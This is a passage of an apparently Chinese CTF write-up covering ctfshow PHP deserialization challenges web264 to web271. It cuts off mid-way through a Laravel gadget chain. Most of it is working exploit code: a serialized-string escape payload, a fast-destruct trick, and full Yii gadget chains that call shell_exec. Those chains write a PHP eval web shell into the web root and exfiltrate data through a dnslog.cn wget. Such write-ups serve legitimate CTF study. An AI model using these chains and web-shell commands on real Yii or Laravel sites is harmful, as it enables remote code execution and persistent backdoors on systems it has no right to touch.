&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>需要<code>$token=&#39;admin&#39;;</code>经过序列化是这样的<code>s:5:&quot;token&quot;;s:5:&quot;admin&quot;;</code>，加上闭合<code>&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code>一共27个字符，每次替换增加一个字符，需要27个fuck吃掉构造函数的$token&#x3D;’user’;</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">message</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$from</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$msg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$to</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">from</span> = <span class="hljs-variable">$f</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;msg = <span class="hljs-variable">$m</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;to = <span class="hljs-variable">$t</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$msg</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;fuck&#x27;</span>,<span class="hljs-string">&#x27;loveU&#x27;</span>,<span class="hljs-variable">$msg</span>);<br>&#125;<br><br><span class="hljs-variable">$msg</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">message</span>(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>);<br><span class="hljs-variable">$msg_u</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$msg</span>);<br><span class="hljs-variable">$msg_1</span>=<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$msg_u</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$msg_1</span>;<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts">?f=a<span class="hljs-variable">&amp;m</span>=b<span class="hljs-variable">&amp;t</span>=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck<span class="hljs-string">&quot;;s:5:&quot;</span>token<span class="hljs-string">&quot;;s:5:&quot;</span>admin<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>在message.php中Cookie:<code>msg=12</code></p><h2 id="web265"><a href="#web265" class="headerlink" title="web265"></a>web265</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshowAdmin</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$t</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;token=<span class="hljs-variable">$t</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;token===<span class="hljs-variable language_">$this</span>-&gt;password;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$ctfshow</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctfshow&#x27;</span>]);<br><span class="hljs-variable">$ctfshow</span>-&gt;token=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">mt_rand</span>());<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ctfshow</span>-&gt;<span class="hljs-title function_ invoke__">login</span>())&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>只能改变password的值，因为token下面有赋值，要让$this-&gt;token&#x3D;&#x3D;&#x3D;$this-&gt;password，可以用引用类型$this-&gt;password &#x3D; &amp;$this-&gt;token;，&amp;和c语言指针类似，取地址</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshowAdmin</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$t</span>=<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$p</span>=<span class="hljs-string">&#x27;&#x27;</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;token=<span class="hljs-variable">$t</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = &amp;<span class="hljs-variable language_">$this</span>-&gt;token;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ctfshowAdmin</span>())<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>tfshow=<span class="hljs-symbol">O:</span><span class="hljs-number">12</span><span class="hljs-symbol">:<span class="hljs-string">&quot;ctfshowAdmin&quot;</span></span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span>&#123;<span class="hljs-symbol">s:</span><span class="hljs-number">5</span><span class="hljs-symbol">:<span class="hljs-string">&quot;token&quot;</span></span>;<span class="hljs-symbol">s:</span><span class="hljs-number">0</span><span class="hljs-symbol">:<span class="hljs-string">&quot;&quot;</span></span>;<span class="hljs-symbol">s:</span><span class="hljs-number">8</span><span class="hljs-symbol">:<span class="hljs-string">&quot;password&quot;</span></span>;<span class="hljs-symbol">R:</span><span class="hljs-number">2</span>;&#125;<br></code></pre></td></tr></table></figure><h2 id="web266"><a href="#web266" class="headerlink" title="web266"></a>web266</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-variable">$cs</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ctfshow</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>=<span class="hljs-string">&#x27;xxxxxx&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-variable">$u</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password=<span class="hljs-variable">$p</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;username===<span class="hljs-variable language_">$this</span>-&gt;password;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;username;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$ctfshowo</span>=@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$cs</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ctfshow/&#x27;</span>, <span class="hljs-variable">$cs</span>))&#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;Error <span class="hljs-subst">$ctfshowo</span>&quot;</span>,<span class="hljs-number">1</span>);<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>destruct会在脚本结束后销毁,而抛出异常导致无法立即执行destruct,所以我们要进行快速析构</p><p>原理:当php接收到畸形序列化字符串时，PHP由于其容错机制，依然可以反序列化成功。但是，由于你给的是一个畸形的序列化字符串，总之他是不标准的，所以PHP对这个畸形序列化字符串得到的对象不放心，于是PHP就要赶紧把它清理掉，那么就触发了他的析构方法。</p><p>方法<br>1.改掉属性的个数<br>2.删掉结尾的}</p><p><img src="/images/BVJ1Z47R.png"></p><h2 id="web267"><a href="#web267" class="headerlink" title="web267"></a>web267</h2><p>源码最下面发现使用了yii框架<br><img src="/images/D0KN2.png"><br>通过admin&#x2F;admin登录，在几个页面中挨个查看源码<br>在about中发现注释的源码<code>&lt;!--?view-source --&gt;</code><br>在后面get传数据<code>/index.php?r=site%2Fabout&amp;view-source</code><br>得到一个新的代码</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span><span class="hljs-regexp">/backdoor/</span>shell<br>unserialize(base64_decode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))<br></code></pre></td></tr></table></figure><p>继续进入<code>?r=backdoor/shell&amp;code=123</code><br>报错了<br>找一个yii利用链</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">yii</span>\<span class="hljs-title class_">rest</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">CreateAction</span>&#123;<br>        <span class="hljs-title class_">public</span> $<span class="hljs-title class_">checkAccess</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;checkAccess = <span class="hljs-string">&#x27;phpinfo&#x27;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;id = <span class="hljs-string">&#x27;1&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Faker</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">yii</span>\<span class="hljs-title class_">rest</span>\<span class="hljs-title class_">CreateAction</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generator</span></span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$formatters</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;formatters[<span class="hljs-string">&#x27;close&#x27;</span>] = [<span class="hljs-keyword">new</span> <span class="hljs-title class_">CreateAction</span>(), <span class="hljs-string">&#x27;run&#x27;</span>];<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">yii</span>\<span class="hljs-title class_">db</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">Faker</span>\<span class="hljs-title class_">Generator</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BatchQueryResult</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$_dataReader</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;_dataReader = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Generator</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span>&#123;<br>    <span class="hljs-title class_">echo</span> <span class="hljs-title class_">base64_encode</span>(<span class="hljs-title class_">serialize</span>(<span class="hljs-title class_">new</span> <span class="hljs-title class_">yii</span>\<span class="hljs-title class_">db</span>\<span class="hljs-title class_">BatchQueryResult</span>));<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p><img src="/images/JH41.png"></p><p>system被过滤了</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">public</span> function __construct()&#123;<br>           $<span class="hljs-keyword">this</span>-&gt;checkAccess = <span class="hljs-string">&#x27;shell_exec&#x27;</span>;<br>           $<span class="hljs-keyword">this</span>-&gt;id = <span class="hljs-string">&#x27;wget `pwd|base64`.n2ybgz.dnslog.cn&#x27;</span>;<br>       &#125;<br></code></pre></td></tr></table></figure><p>利用<a href="http://www.dnslog.cn/">dnslog</a>得到web目录&#x2F;var&#x2F;www&#x2F;html&#x2F;basic&#x2F;web(用base64解码)<br><img src="/images/UKOS7.png"></p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">public function __construct()&#123;</span><br><span class="language-xml">            $this-&gt;checkAccess = &#x27;shell_exec&#x27;;</span><br><span class="language-xml">            $this-&gt;id = &quot;echo &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(\<span class="hljs-variable">$_POST</span>[g]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27; &gt; /var/www/html/basic/web/3.php&quot;;</span><br><span class="language-xml">        &#125;</span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure><p><img src="/images/W46.png"><br>进入3.php<br>payload：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">POST:<br>g=<span class="hljs-built_in">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="web268"><a href="#web268" class="headerlink" title="web268"></a>web268</h2><p>前面步骤与267相同，admin&#x2F;admin登录<br>在输入code时发现没有回显，说明yii链被禁用或者关键词被过滤<br>所以本题换一种yii链</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs scala">&lt;?php<br>namespace yii\rest &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Action</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">\yii\base\Action</span></span><br>    &#123;<br>        public $checkAccess;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IndexAction</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Action</span></span><br>    &#123;<br>        public function __construct($func, $param)<br>        &#123;<br>            $<span class="hljs-keyword">this</span>-&gt;checkAccess = $func;<br>            $<span class="hljs-keyword">this</span>-&gt;id = $param;<br>        &#125;<br>    &#125;<br>&#125;<br>namespace yii\web &#123;<br>    <span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MultiFieldSession</span></span><br>    &#123;<br>        public $writeCallback;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DbSession</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">MultiFieldSession</span></span><br>    &#123;<br>        public function __construct($func, $param)<br>        &#123;<br>            $<span class="hljs-keyword">this</span>-&gt;writeCallback = [<span class="hljs-keyword">new</span> \yii\rest\<span class="hljs-type">IndexAction</span>($func, $param), <span class="hljs-string">&quot;run&quot;</span>];<br>        &#125;<br>    &#125;<br>&#125;<br>namespace yii\base &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BaseObject</span></span><br>    &#123;<br>        <span class="hljs-comment">//</span><br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Action</span></span><br>    &#123;<br>        public $id;<br>    &#125;<br>&#125;<br>namespace yii\db &#123;<br>    use yii\base\<span class="hljs-type">BaseObject</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BatchQueryResult</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">BaseObject</span></span><br>    &#123;<br>        <span class="hljs-keyword">private</span> $_dataReader;<br>        public function __construct($func, $param)<br>        &#123;<br>            $<span class="hljs-keyword">this</span>-&gt;_dataReader = <span class="hljs-keyword">new</span> \yii\web\<span class="hljs-type">DbSession</span>($func, $param);<br>        &#125;<br>    &#125;<br>&#125;<br>namespace&#123;<br>    $exp = <span class="hljs-keyword">new</span> \yii\db\<span class="hljs-type">BatchQueryResult</span>(&#x27;shell_exec&#x27;, &#x27;echo <span class="hljs-string">&quot;&lt;?php eval(\$_POST[g]);?&gt;&quot;</span> &gt; /<span class="hljs-keyword">var</span>/www/html/basic/web/<span class="hljs-number">3.</span>php&#x27;);<br>    echo base64_encode(serialize($exp));<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>进入3.php<br>payload</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">POST:<br>g=<span class="hljs-built_in">system</span>(<span class="hljs-string">&#x27;cat /flags&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="web269"><a href="#web269" class="headerlink" title="web269"></a>web269</h2><p>与web268相同，使用同样的yii链<br>进入3.php</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">POST:<br>g=<span class="hljs-built_in">system</span>(<span class="hljs-string">&#x27;cat /flagsa&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="web270"><a href="#web270" class="headerlink" title="web270"></a>web270</h2><p>与web268相同，使用同样的yii链<br>进入3.php</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">POST:<br>g=<span class="hljs-built_in">system</span>(<span class="hljs-string">&#x27;cat /flagsa&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="web271"><a href="#web271" class="headerlink" title="web271"></a>web271</h2><p>根据 * Laravel - A PHP Framework For Web Artisans可知用的是Laravel框架<br>Laravel框架有直接可以使用的反序列化链子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Illuminate</span>\<span class="hljs-title class_">Foundation</span>\<span class="hljs-title class_">Testing</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">PendingCommand</span>&#123;<br>        <span class="hljs-title class_">protected</span> $<span class="hljs-title class_">command</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$parameters</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$app</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$command</span>, <span class="hljs-variable">$parameters</span>,<span class="hljs-variable">$class</span>,<span class="hljs-variable">$app</span></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;command = <span class="hljs-variable">$command</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;parameters = <span class="hljs-variable">$parameters</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;test=<span class="hljs-variable">$class</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;app=<span class="hljs-variable">$app</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Illuminate</span>\<span class="hljs-title class_">Auth</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">GenericUser</span>&#123;<br>        <span class="hljs-title class_">protected</span> $<span class="hljs-title class_">attributes</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$attributes</span></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;attributes = <span class="hljs-variable">$attributes</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Illuminate</span>\<span class="hljs-title class_">Foundation</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">Application</span>&#123;<br>        <span class="hljs-title class_">protected</span> $<span class="hljs-title class_">hasBeenBootstrapped</span> = <span class="hljs-title class_">false</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$bindings</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$bind</span></span>)</span>&#123;<br>            <span class="hljs-variable 